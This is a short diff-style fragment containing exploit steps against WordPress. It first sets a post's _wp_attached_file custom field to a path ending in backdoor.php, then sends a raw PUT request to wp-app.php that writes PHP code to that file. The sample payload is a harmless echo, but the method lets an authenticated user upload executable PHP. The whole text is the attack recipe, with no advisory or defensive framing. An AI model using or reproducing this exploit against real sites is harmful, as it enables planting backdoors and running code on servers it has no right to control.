@@ -1,0 +1,17 @@
+   1.
+
+      Create or edit a post and add/override a custom field to it with the following value:
+
+      key 	: _wp_attached_file
+      value 	: /home/vulnerable.com/wp/wp-content/uploads/backdoor.php
+
+   2. Send a PUT request to wp-app.php and pass the post_ID value from step 1
+
+      PUT /wp/wp-app.php?action=/attachment/file/post_ID HTTP/1.1
+      Cookie: auth cookies
+      Content-Type: image/gif
+      Host: vulnerable.com
+      Content-Length: the content length
+
+      <?php echo "Hello World"; ?>
+
